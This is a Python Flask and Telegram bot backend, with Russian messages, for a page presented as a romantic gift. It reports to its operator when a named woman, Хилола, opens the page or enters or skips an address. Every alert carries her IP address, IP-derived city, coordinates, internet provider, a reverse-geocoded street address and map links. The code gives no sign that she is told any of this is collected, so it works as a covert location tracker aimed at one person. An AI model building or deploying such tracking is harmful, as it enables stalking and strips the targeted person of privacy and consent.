import os
import logging
import requests
from telegram import Update, Bot
from telegram.ext import Application, CommandHandler, ContextTypes
from dotenv import load_dotenv
from flask import Flask, request, jsonify
from flask_cors import CORS
import threading

# Load environment variables
load_dotenv()

# Configure logging
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# Bot configuration
BOT_TOKEN = os.getenv('BOT_TOKEN')
YOUR_CHAT_ID = os.getenv('CHAT_ID')

# Initialize bot
bot = Bot(token=BOT_TOKEN)

# Flask app for webhook
app = Flask(__name__)
CORS(app)  # Enable CORS for React frontend

# Store bot application globally
telegram_app = None

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /start command"""
    await update.message.reply_text(
        '🎁 Романтический Бот активирован!\n\n'
        'Этот бот будет отправлять вам уведомления когда Хилола:\n'
        '• Открывает страницу\n'
        '• Вводит адрес\n'
        '• Пропускает адрес\n\n'
        f'Ваш Chat ID: {update.effective_chat.id}'
    )

async def send_notification(chat_id: str, message: str):
    """Send notification to Telegram"""
    try:
        await bot.send_message(
            chat_id=chat_id,
            text=message,
            parse_mode='HTML'
        )
        logger.info(f"Message sent to {chat_id}")
        return True
    except Exception as e:
        logger.error(f"Error sending message: {e}")
        return False

def get_address_from_coordinates(lat, lon):
    """Convert coordinates to readable address using Nominatim (OpenStreetMap)"""
    try:
        # Using Nominatim API (free, no key required)
        url = f"https://nominatim.openstreetmap.org/reverse?format=json&lat={lat}&lon={lon}&zoom=18&addressdetails=1"
        headers = {
            'User-Agent': 'RomanticGiftApp/1.0'
        }
        
        response = requests.get(url, headers=headers, timeout=5)
        data = response.json()
        
        if 'address' in data:
            addr = data['address']
            
            # Build readable address
            parts = []
            
            # Road/Street
            if 'road' in addr:
                parts.append(addr['road'])
            elif 'pedestrian' in addr:
                parts.append(addr['pedestrian'])
            
            # House number
            if 'house_number' in addr:
                parts.append(f"дом {addr['house_number']}")
            
            # Neighbourhood/District
            if 'neighbourhood' in addr:
                parts.append(addr['neighbourhood'])
            elif 'suburb' in addr:
                parts.append(addr['suburb'])
            elif 'district' in addr:
                parts.append(addr['district'])
            
            # City
            if 'city' in addr:
                parts.append(addr['city'])
            elif 'town' in addr:
                parts.append(addr['town'])
            
            # Full formatted address
            full_address = data.get('display_name', 'Адрес не найден')
            short_address = ', '.join(parts) if parts else full_address
            
            return {
                'short': short_address,
                'full': full_address,
                'success': True
            }
        
        return {
            'short': 'Адрес не определен',
            'full': 'Адрес не определен',
            'success': False
        }
        
    except Exception as e:
        logger.error(f"Geocoding error: {e}")
        return {
            'short': 'Ошибка определения адреса',
            'full': 'Ошибка определения адреса',
            'success': False
        }

@app.route('/api/notify', methods=['POST'])
def notify():
    """Receive notification from frontend"""
    try:
        data = request.get_json()
        
        # Build message
        message_type = data.get('type', 'Уведомление')
        address = data.get('address', '')
        ip = data.get('ip', 'N/A')
        city = data.get('city', 'N/A')
        region = data.get('region', 'N/A')
        country = data.get('country', 'N/A')
        loc = data.get('loc', 'N/A')
        org = data.get('org', 'N/A')
        timestamp = data.get('timestamp', 'N/A')
        
        # Get readable address from coordinates
        address_info = {'short': 'N/A', 'full': 'N/A', 'success': False}
        if loc and loc != 'N/A':
            try:
                lat, lon = loc.split(',')
                address_info = get_address_from_coordinates(lat.strip(), lon.strip())
            except:
                pass
        
        # Google Maps link
        maps_link = f"https://www.google.com/maps?q={loc}" if loc != 'N/A' else "N/A"
        yandex_maps_link = f"https://yandex.uz/maps/?ll={loc.split(',')[1]},{loc.split(',')[0]}&z=17" if loc != 'N/A' else "N/A"
        
        # Format message with address
        message = f"""
<b>{message_type}</b>

{f'📮 <b>АДРЕС (введенный):</b> {address}\n' if address else ''}
━━━━━━━━━━━━━━━━━━━━━
<b>📍 МЕСТОПОЛОЖЕНИЕ ПО IP:</b>

🏠 <b>Адрес:</b> {address_info['short']}

🌐 <b>IP:</b> <code>{ip}</code>
🏙 <b>Город:</b> {city}
🗺 <b>Регион:</b> {region}
🌍 <b>Страна:</b> {country}

📍 <b>Координаты:</b> <code>{loc}</code>
🗺 <a href="{maps_link}">Google Maps</a> | <a href="{yandex_maps_link}">Yandex Maps</a>

🌐 <b>Провайдер:</b> {org}
⏰ <b>Время:</b> {timestamp}

━━━━━━━━━━━━━━━━━━━━━
<i>Полный адрес:</i>
{address_info['full']}
        """
        
        # Send notification synchronously
        import asyncio
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        result = loop.run_until_complete(send_notification(YOUR_CHAT_ID, message))
        loop.close()
        
        if result:
            return jsonify({'success': True, 'message': 'Notification sent'}), 200
        else:
            return jsonify({'success': False, 'message': 'Failed to send'}), 500
            
    except Exception as e:
        logger.error(f"Error in notify endpoint: {e}")
        return jsonify({'success': False, 'error': str(e)}), 500

@app.route('/health', methods=['GET'])
def health():
    """Health check endpoint"""
    return jsonify({'status': 'ok', 'bot': 'running'}), 200

def run_flask():
    """Run Flask server"""
    port = int(os.getenv('PORT', 5000))
    app.run(host='0.0.0.0', port=port, debug=False)

def main():
    """Main function"""
    global telegram_app
    
    # Create the Application
    telegram_app = Application.builder().token(BOT_TOKEN).build()
    
    # Add handlers
    telegram_app.add_handler(CommandHandler("start", start))
    
    # Start Flask in a separate thread
    flask_thread = threading.Thread(target=run_flask, daemon=True)
    flask_thread.start()
    
    logger.info("Bot is starting...")
    logger.info(f"Flask server running on port {os.getenv('PORT', 5000)}")
    logger.info(f"Your Chat ID: {YOUR_CHAT_ID}")
    
    # Run the bot
    telegram_app.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == '__main__':
    main()